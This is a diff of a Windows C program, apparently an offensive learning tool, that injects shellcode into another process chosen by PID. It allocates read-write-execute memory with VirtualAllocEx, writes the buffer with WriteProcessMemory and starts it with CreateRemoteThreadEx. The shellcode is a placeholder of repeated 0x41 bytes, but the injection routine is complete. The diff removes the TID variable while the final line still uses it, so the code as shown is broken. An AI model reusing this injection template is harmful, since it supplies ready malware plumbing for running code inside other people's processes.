@@ -5,13 +5,18 @@
 #define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
 #define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 
-DWORD PID, TID;
-HANDLE hProcess, hThread = NULL;
-
-unsigned char sc[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
-
 int main(int argc, char* argv[])
 {
+
+    DWORD PID = 0;
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    LPVOID lpThreadProc = NULL;
+    
+    /* const keyword makes it so sc is placed in .rdata */
+    CONST UCHAR sc[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+    SIZE_T scSize = sizeof(sc);
+    
     okay("program startin");
     if (argc < 2)
     {
@@ -33,12 +38,12 @@ int main(int argc, char* argv[])
 
     /* alloc bytes */
     okay("Allocating buffer on memory of process %ld", PID);
-    LPVOID lpThreadProc = VirtualAllocEx(hProcess, NULL, sizeof(sc), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE perm", sizeof(sc));
+    lpThreadProc = VirtualAllocEx(hProcess, NULL, scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE perm", scSize);
 
     /* write allocated mem to process mem */
-    WriteProcessMemory(hProcess, lpThreadProc, sc, sizeof(sc), NULL);
-    okay("Wrote %zu bytes to allocated buffer", sizeof(sc));
+    WriteProcessMemory(hProcess, lpThreadProc, sc, scSize, NULL);
+    okay("Wrote %zu bytes to allocated buffer", scSize);
 
     /* create thread to run payload */
     hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpThreadProc, NULL, 0, 0, &TID);
